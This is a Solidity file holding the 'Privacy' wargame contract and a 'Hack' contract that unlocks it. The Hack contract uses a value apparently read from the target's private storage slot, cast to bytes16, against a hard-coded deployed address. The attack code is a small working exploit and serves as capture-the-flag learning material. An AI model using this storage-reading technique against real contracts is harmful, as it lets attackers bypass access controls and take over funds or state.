// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(block.timestamp);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }
}

contract Hack{
    
    Privacy target = Privacy(0x5Ac24c630f6D624c230fcdF8Fc986b5354060E9e);

    bytes32 public secret = 0xbc3f8f57b941583ea98de8b36fca797ce7d7117e9e72c0ceaad0fc4fe2047bdf; 

    bytes16 public secret16 = bytes16(secret);

    function attack() public{
        target.unlock(secret16);
    }
}